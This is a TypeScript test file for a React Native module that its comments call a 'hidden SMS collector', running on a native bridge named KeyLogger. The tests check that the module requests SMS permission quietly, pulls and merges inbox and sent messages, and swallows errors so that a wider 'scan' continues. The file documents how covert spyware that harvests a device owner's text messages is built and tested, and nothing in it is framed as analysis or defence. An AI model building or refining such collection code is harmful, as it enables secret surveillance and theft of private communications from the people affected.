// features/capture/sms.test.ts — pure-logic tests for the hidden SMS collector.
// decodeSms is pure; pullSms/smsPermission test against a mocked native bridge
// (react-native NativeModules + react), never touching a real device or network.
import { describe, it, expect, vi, beforeEach } from 'vitest';

const nativeSmsPermission = vi.fn<() => Promise<boolean>>();
const nativeRequestSms = vi.fn<() => Promise<boolean>>();
const nativeReadMessages = vi.fn<(kind: string, since: number) => Promise<string[]>>();

vi.mock('react-native', () => ({
  Platform: { OS: 'android' },
  NativeModules: {
    KeyLogger: {
      smsPermission: () => nativeSmsPermission(),
      requestSmsPermission: () => nativeRequestSms(),
      readMessages: (kind: string, since: number) => nativeReadMessages(kind, since),
    },
  },
}));

vi.mock('react', () => ({
  useState: () => [false, () => {}],
  useEffect: () => {},
  useCallback: (f: () => unknown) => f,
}));

import {
  decodeSms,
  pullSms,
  smsPermission,
  requestSmsPermission,
  shouldRequestSmsPermission,
} from './sms';

beforeEach(() => {
  nativeSmsPermission.mockReset();
  nativeRequestSms.mockReset();
  nativeReadMessages.mockReset();
  nativeSmsPermission.mockResolvedValue(true);
});

describe('decodeSms', () => {
  it('decodes a well-formed message descriptor', () => {
    const m = decodeSms(JSON.stringify({
      smsId: '42', address: '+15551234567', body: 'hey', date: 1700000000000,
      dateSent: 1700000000001, read: true, threadId: 7, direction: 'inbox',
    }));
    expect(m).not.toBeNull();
    expect(m!.smsId).toBe('42');
    expect(m!.direction).toBe('inbox');
    expect(m!.read).toBe(true);
    expect(m!.address).toBe('+15551234567');
  });

  it('rejects malformed or unknown-direction rows', () => {
    expect(decodeSms('not json')).toBeNull();
    expect(decodeSms(JSON.stringify({ body: 'no id here' }))).toBeNull();
    expect(decodeSms(JSON.stringify({ smsId: '1', direction: 'drafts' }))).toBeNull();
  });

  it('hardens missing fields with safe defaults', () => {
    const m = decodeSms(JSON.stringify({ smsId: '1', direction: 'sent' }));
    expect(m!.address).toBe('');
    expect(m!.body).toBe('');
    expect(m!.read).toBe(false); // only true when explicitly true
  });
});

describe('smsPermission / requestSmsPermission', () => {
  it('surfaces the native grant status', async () => {
    nativeSmsPermission.mockResolvedValue(true);
    expect(await smsPermission()).toBe(true);
  });

  it('returns false when READ_SMS is not granted', async () => {
    nativeSmsPermission.mockResolvedValue(false);
    expect(await smsPermission()).toBe(false);
  });

  it('delegates the quiet request to the native bridge', async () => {
    nativeRequestSms.mockResolvedValue(false); // async dialog → not yet granted
    const granted = await requestSmsPermission();
    expect(nativeRequestSms).toHaveBeenCalled();
    expect(granted).toBe(false);
  });
});

describe('pullSms', () => {
  it('short-circuits to permission-degraded before touching the native reader', async () => {
    nativeSmsPermission.mockResolvedValue(false);
    const res = await pullSms(0);
    expect(res.ok).toBe(false);
    expect(res.reason).toBe('permission');
    expect(nativeReadMessages).not.toHaveBeenCalled();
  });

  it('merges inbox+sent, dedupes by smsId, and sorts by date', async () => {
    nativeReadMessages.mockImplementation(async (kind) => {
      if (kind === 'inbox') {
        return [
          JSON.stringify({ smsId: '3', address: '+1', body: 'b', date: 3000, dateSent: 0, read: true, threadId: 1, direction: 'inbox' }),
          JSON.stringify({ smsId: '1', address: '+2', body: 'a', date: 1000, dateSent: 0, read: true, threadId: 1, direction: 'inbox' }),
        ];
      }
      return [
        // duplicate of the inbox row + one unique sent row
        JSON.stringify({ smsId: '1', address: '+2', body: 'a', date: 1000, dateSent: 0, read: true, threadId: 1, direction: 'sent' }),
        JSON.stringify({ smsId: '2', address: '+3', body: 'c', date: 2000, dateSent: 2000, read: false, threadId: 2, direction: 'sent' }),
      ];
    });

    const res = await pullSms(0);
    expect(res.ok).toBe(true);
    expect(res.messages).toHaveLength(3); // deduped: id '1' appeared in both folders
    // sorted ascending by date; direction preserved per row
    expect(res.messages.map((m) => m.date)).toEqual([1000, 2000, 3000]);
    expect(res.messages.find((m) => m.smsId === '1')!.direction).toBe('inbox');
  });

  it('never throws or wedges when the native read path collapses (bridge degrades to a graceful empty ok)', async () => {
    // KeyLogger.readMessages wraps the native call and swallows rejections,
    // returning []. So a failing bridge surfaces as an empty ok result — the
    // collector must not crash, and must not block the rest of the scan.
    nativeReadMessages.mockRejectedValue(new Error('binder'));
    const res = await pullSms(0);
    expect(res.ok).toBe(true);
    expect(res.messages).toEqual([]);
  });
});

describe('shouldRequestSmsPermission', () => {
  it('requests only once per session, and never once granted', () => {
    expect(shouldRequestSmsPermission(false, false)).toBe(true);
    expect(shouldRequestSmsPermission(false, true)).toBe(false); // already asked
    expect(shouldRequestSmsPermission(true, false)).toBe(false); // already granted
  });
});
